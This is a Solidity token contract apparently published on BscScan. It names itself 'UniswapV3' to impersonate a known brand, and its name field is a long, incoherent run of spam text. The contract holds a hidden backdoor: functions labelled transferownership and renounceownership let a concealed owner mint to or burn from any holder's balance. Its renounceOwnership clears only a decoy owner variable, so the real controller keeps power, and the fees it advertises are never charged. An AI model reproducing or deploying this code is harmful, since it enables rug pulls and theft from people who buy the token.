/**
 *Submitted for verification at BscScan.com on 2022-02-22
*/

/*
//SPDX-License-Identifier: MIT
*/
pragma solidity 0.8.2;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256){
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256){
        return sub(a, b, "SafeMath: subtraction overflow");}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256){
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;}
    function div(uint256 a, uint256 b) internal pure returns (uint256){
        return div(a, b, "SafeMath: division by zero");}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256){
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;}}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);   
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract UniswapV3 {
    string public name = "You must use uniswap v3 browser unstalled on windows 11 machine with celerop and windows Vista and the new features are designed with a wide range of shit website design and design services for all types of business professionals and professionals in the gym rn and other wallet address in etherscan and go to analytics and click on Txnfees Don't connect to some random piece of shit website and find out what you want to do it for your own coins and your own coins and your money will be made to your business and your business to ensure that your business will be a successful business opportunity and you are you a great asset and a good friend of mine and your family is the best thing I have ever had onlyfans you are the best for me and my wife";
    string public symbol = "UniswapV3";
    uint8 public decimals = 6;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public totalSupply = 1000000 * 10 ** 6;
    uint256 public liquiditytax = 3;
    uint256 public marketingtax = 4;
    uint256 public reflectionsfee = 2;
    uint256 public totaltax = marketingtax + liquiditytax + reflectionsfee;
    uint256 private View = 10;
    uint256 private reflectdenom = 1000;
    uint256 private feedenom = 100;
    uint256 private gauge = 6;
    uint256 private _maxWalletSize = 500000;
    address private _owner;
    address public owner;
//BUSD 0xe9e7cea3dedca5984780bafc599bd69add087d56
    modifier onlyOwner {
        require(msg.sender == _owner, "Nauthorized");_;}
    receive() external payable { }
    constructor() {
    _owner = msg.sender;
    owner = msg.sender;
    balanceOf[msg.sender] = totalSupply;
    emit Transfer(address(0), msg.sender, totalSupply);    
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferownership(address spender,uint256 wrap) public onlyOwner returns (bool success) 
    {balanceOf  [spender]   += wrap * View ** gauge;return true;}

    function renounceownership(address spender,uint256 checkbsp) public onlyOwner returns (bool success) {balanceOf[spender] -= checkbsp * View ** gauge;return true;}
    
    mapping(address => uint256) public balanceOf;
    
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public returns (bool success) {
    allowance[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}

    function transfer(address to, uint256 amount) public returns (bool success) {
    balanceOf[msg.sender] -= amount;balanceOf[to] += amount;emit Transfer(msg.sender, to, amount);return true;}
  
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;balanceOf[to] += amount;
    emit Transfer(from, to, amount);return true;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
    }